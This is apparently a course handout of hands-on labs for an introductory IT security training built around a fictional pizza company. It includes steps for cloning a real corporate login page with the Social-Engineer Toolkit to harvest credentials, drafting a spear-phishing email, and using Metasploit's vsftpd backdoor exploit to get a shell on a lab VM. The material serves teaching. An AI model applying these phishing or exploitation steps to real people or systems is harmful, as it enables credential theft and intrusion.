# LAB: Introduction to IT Security

> **Write down your answers and observations in your own notes (one file per team is enough).**

Throughout the training we use a fictional company as a running example:
**[Pizza Pronto](company/README.md)** – you are its security team.

The hands-on labs, in the order of the training:

| # | Lab | Chapter | Time |
|---|-----|---------|------|
| 1 | [Pizza Pronto: Crown Jewels (C/I/A)](#pizza-pronto-crown-jewels-cia-10-min) | Basics | 10 min |
| 2 | [Pizza Pronto: Who Gets Access?](#pizza-pronto-who-gets-access-10-min) | Basics | 10 min |
| 3 | [Detecting Phishing Emails](#detecting-phishing-emails-10-min) | Attackers & Attacks | 10 min |
| 4 | **[OSINT Challenge: Investigate Pizza Pronto](labs/osint/README.md)** | Attackers & Attacks | 45 min |
| 5 | [Social Engineering Attack Simulation](#social-engineering-attack-simulation-20-min) | Attackers & Attacks | 20 min |
| 6 | [Vulnerability Scanning](#vulnerability-scanning-45-minutes) | Vulnerabilities | 45 min |
| 7 | [CVSS Calculation](#cvss-calculation-10-min) | Vulnerabilities | 10 min |
| 8 | **[Supply Chain, DevSecOps & Skill Battle](labs/pizza-pronto/README.md)** | DevSecOps | 30–150 min |
| 9 | [ISMS Policy Writing](#isms-policy-writing-30-minutes) | Security Management | 30 min |
| 10 | [Cryptanalysis Exercises](#cryptanalysis-exercises-15-min) | Cryptography | 15 min |

---

## Pizza Pronto: Crown Jewels (C/I/A) (10 min)

**Goal:** apply the protection goals confidentiality, integrity and availability to real (fictional) assets.

1. Read the short description of [Pizza Pronto](company/README.md) – especially "Crown Jewels".
2. In your team, rate each asset: how important is **C**, **I** and **A**? Use *high / medium / low*.
3. Write **one reason** for every "high" (What exactly would happen if it is lost / changed / unavailable?).
4. Be ready to present one asset in the plenary.

| Asset | Confidentiality | Integrity | Availability | Reason for "high" |
|---|---|---|---|---|
| Customer data (names, addresses, order history) | | | | |
| Order website | | | | |
| Payment & bank access | | | | |
| Instagram & online reviews | | | | |
| Grandma Romano's secret dough recipe | | | | |

<details><summary>Hint</summary>

Ask three questions per asset: *What if a stranger reads it?* (C) – *What if someone secretly changes it?* (I) –
*What if it is gone on Friday at 7 pm?* (A)
</details>

**Reflect:** Which incident from chapter 1 (freezers, Berlin Senate, DB Navigator, Instagram accounts) violated which goal?

---

## Pizza Pronto: Who Gets Access? (10 min)

**Goal:** apply *least privilege*, *no shared accounts* and *segregation of duties*.

1. Look at the people and systems in the [Pizza Pronto description](company/README.md).
2. Fill in the matrix: **full** / **read** / **own data only** / **no access** – and why.
3. Mark what is badly solved at Pizza Pronto **today**.

| Person | Shop admin | Office PC | Banking | Instagram | Customer data |
|---|---|---|---|---|---|
| Giulia (owner) | | | | | |
| Lena (apprentice) | | | | | |
| Luca (IT, nephew) | | | | | |
| Cooks (Marco, Elif) | | | | | |
| Drivers (Jonas, Mia, Kevin) | | | | | |

<details><summary>Hint</summary>

- Does Lena need online banking to handle supplier invoices – or only to *prepare* payments?
- What happens if Luca moves away after his studies?
- Who uses the office PC password on the counter?
</details>

---

## Detecting Phishing Emails (10 min)

Use the following quiz to practice identifying phishing emails:
https://phishingquiz.withgoogle.com/

---

## Social Engineering Attack Simulation (20 min)

In this lab, you will simulate a social engineering attack using a phishing website to demonstrate how attackers can trick users into revealing sensitive information.

We want to fake the login page of a well-known service (e.g., Bosch Corporate Benefits) and create a spear phishing email to lure users into entering their credentials.

### 1. Choose a Phishing Domain

Think of a domain name that closely resembles the legitimate service's domain. Te legitimate site is "bosch.mitarbeiterangebote.de".
You can check free domains on websites like https://www.checkdomain.de.

### 2. Prepare the Phishing Site

We will use the Social-Engineer Toolkit (SET) to create a phishing site that mimics a legitimate login page.

1. Start the Social-Engineer Toolkit:
   ```bash
   sudo setoolkit
   ```
2. Selet Website Attack Vectors (1)
3. Select Credential Harvester Attack Method (3)
4. Select Site Cloner (2)
5. Enter the URL of the legitimate site to clone:
   ```
   https://bosch.mitarbeiterangebote.de/login
   ```
6. Open your web browser and navigate to "http://localhost" to see the cloned site.
7. Enter (fake) credentials and submit the form. Observe the behavior.
8. Go back to the terminal where SET is running to view the captured credentials.

### 3. Formulate a Spear Phishing Email

Create a convincing email (DE or EN) that appears to come from a trusted source within the organization. Include a link to the cloned site.

The usage of AI tools is allowed to draft the email content.

### Variant: Pizza Pronto (after the OSINT challenge)

Use the pretext you built in [OSINT Part D](labs/osint/README.md#part-d--build-the-pretext-10-min):
write the spear phishing e-mail to **Lena** (lena.schuster@pizza-pronto.example), e.g. as "Herr Brandt" from
Mühle Schäfer announcing new bank details. Name at least three facts you used – and three red flags Lena could spot.


---


## Vulnerability Scanning (45 minutes)

In this lab you will learn the typical workflow of vulnerability scanning and exploitation:

1. Discover a target system  
2. Identify open services and versions  
3. Research known vulnerabilities  
4. Select an appropriate exploit  
5. Exploit the system 

### Step 1: Start the Virtual Machines

1. Make sure the network settings are configured as follows:
   - it-security-training:
     - Adapter 1: NAT
     - Adapter 2: Host-only Adapter
   - metasploitable:
     - Adapter 1: Host-only Adapter
2. Start both virtual machines:
   - it-security-training
   - metasploitable
3. Wait until both systems have fully booted.
4. Log in to the it-security-training VM with:
   - Username: kali
   - Password: kali

### Step 2: Identify the Target IP Address

Before scanning or attacking, you must know where the target system is located in the network.

1. Check your own IP address:
    ```bash
    ip a
    ```
    Example:

    ```
    eth1: 192.168.56.101/24
    ```

    This means the network range is:

    ```
    192.168.56.0/24
    ```
    Write it down.
2. Discover hosts in the network using a nmap scan:
    ```bash
    nmap -sn <ip-range>
    ```
    You should see two “Oracle VirtualBox virtual NIC” hosts:
    - Your attacker VM
    - The target VM 
    Write down the target IP.

### Step 3: Scan the Target with Nmap

In this step, you will identify all open ports and running services, including their versions.

Run the following Nmap scan:

```bash
nmap -sV -p- <target-ip>
```

Explanation:
- `-sV` → service and version detection  
- `-p-` → scan all 65.535 TCP ports  

Review the output carefully and note the discovered services.

### Step 4: Focus on the FTP Service

Identify which FTP service and version is running on the target system.

#### Research Known Vulnerabilities

Search online for known vulnerabilities related to the identified FTP service and version.

Hints:
- Use search terms like <service-name> <version> vulnerability
- Look for CVEs or public exploit references

Write down your findings.

### Step 5: Exploitation with Metasploit

#### Start Metasploit

```bash
msfconsole
```

Wait until Metasploit finishes loading.

#### Search for a module

```text
search vsftpd
```

You should see an entry similar to:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

#### Select the exploit

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

#### View required options

```text
show options
```

Relevant options:
- `RHOSTS` → target IP address
- `RPORT` → FTP port (default: 21)

#### Configure the exploit

```text
set RHOSTS <target-ip>
```

#### Execute the Exploit

```text
run
```

If successful, you will receive a shell on the target system.

#### Verify Access

Inside the obtained shell:

```bash
whoami
```

```bash
ls
```

### Step 6: Interpretation

Reflect on the attack:
- What vulnerability was exploited?
- Why was exploitation possible?
- Which defensive measures could have prevented this attack?

Write down your observations.

### Step 7: Next Steps

After successfully exploiting the system, what would be your next steps as an attacker?

Write down a short list of possible next steps.

### Step 8: Cleanup

Shut down both virtual machines.



---

## CVSS Calculation (10 min)

In this lab, you will calculate the CVSS score for a given vulnerability scenario.

### Scenario

During an internal security assessment, a vulnerability was discovered in a custom-built HR web portal running on a Linux server.

The vulnerable functionality is part of a document upload feature that is only accessible to members of the HR department.
Access to the HR portal requires:
- A corporate user account
- Membership in the HR role
- VPN access

The HR portal is generally well protected and not accessible to regular employees or external users.

Due to insufficient server-side validation, an attacker with access to the HR portal can upload a specially crafted PHP file, which under certain conditions gets executed by the web server. Successful exploitation results in remote code execution with root privileges.

Exploitation:
- Requires deep technical knowledge of the application logic
- Requires precise timing and a specific server configuration
- Is not reliably exploitable and may fail multiple times

No user interaction is required beyond the attacker’s own actions.

After exploitation, the attacker can:
- Access and modify sensitive HR documents
- Modify system configuration and scripts

The system remains partially operational, but service stability is degraded.

The compromise does not automatically propagate to other systems.

### Task

Calculate the CVSS v3.1 base score using an online calculator (e.g., https://www.first.org/cvss/calculator/3.1)


---


## ISMS Policy Writing (30 minutes)

The goal of this exercise is to understand how information security requirements are translated into concrete security policies as part of an Information Security Management System (ISMS).

You will work in groups and create a short and practical security policy for a specific topic.


### Setup
- Form **5 groups**
- Each group represents the **IT security team** of a mid-sized company (~1.000 employees)
- Each group receives **one policy topic**

### Group Assignments

**Group 1 – Password Policy**  
Define rules for creating, using, and managing passwords.

**Group 2 – Endpoint Protection / Antivirus Policy**  
Define how malware protection is handled on company devices.

**Group 3 – Logging & Monitoring Policy**  
Define what is logged, monitored, and reviewed for security purposes.

**Group 4 – Backup Policy**  
Define how company data is backed up and restored.

**Group 5 – Secure AI Usage Policy**  
Define how AI tools (e.g. ChatGPT, Copilot) may be used in a corporate environment.



### Task

Write a **1-page security policy** for your assigned topic.

- Write in EN or DE
- Assume real-world constraints (time, budget, users)
- Length: ½ to 1 page

Your policy must include the following sections:

1. **Purpose**  
   - Why does this policy exist?
   - What security goal does it support?

2. **Scope**  
   - Who does this policy apply to?
   - Which systems, data, or devices are covered?

3. **Rules & Requirements**  
   - Clear and concrete rules
   - What is mandatory?
   - What is forbidden?
   - What is optional or requires approval?

4. **Responsibilities**  
   - Who is responsible for implementation?
   - Who is responsible for monitoring and enforcement?

5. **Non-Compliance** (short)  
   - What happens if the policy is violated?

You can use this template: [Security Policy Template](policy-template.md)


---

## Cryptanalysis Exercises (15 min)

**Goal:** break two classic ciphers without knowing the key – and understand why modern ciphers are different.
Tool (optional): [CyberChef](https://gchq.github.io/CyberChef/) or pen and paper.

### 1. Substitution cipher (English text)

```
JSHWDUYNTS   STY   QNPJ   F   GTXHM
```

<details><summary>Hint 1</summary>
It is a Caesar cipher: every letter is shifted by the same number of positions.
</details>
<details><summary>Hint 2</summary>
There are only 25 possible keys – try them all (CyberChef: "ROT13" with a custom amount), or guess the one-letter word.
</details>

### 2. Transposition cipher (English text)

```
TMENASSHYNTTUFIHPETCUSILXACLIDATCE!SDI.KS
```

<details><summary>Hint 1</summary>
The letters are correct, only their order is changed. The text was written <b>row by row</b> into a table and read <b>column by column</b>.
</details>
<details><summary>Hint 2</summary>
The text has 41 characters. Try different numbers of columns and write the ciphertext back into the columns top-down. One of them gives readable English.
</details>

**Reflect:** Which tactics did you use? Why do these tactics fail against AES?

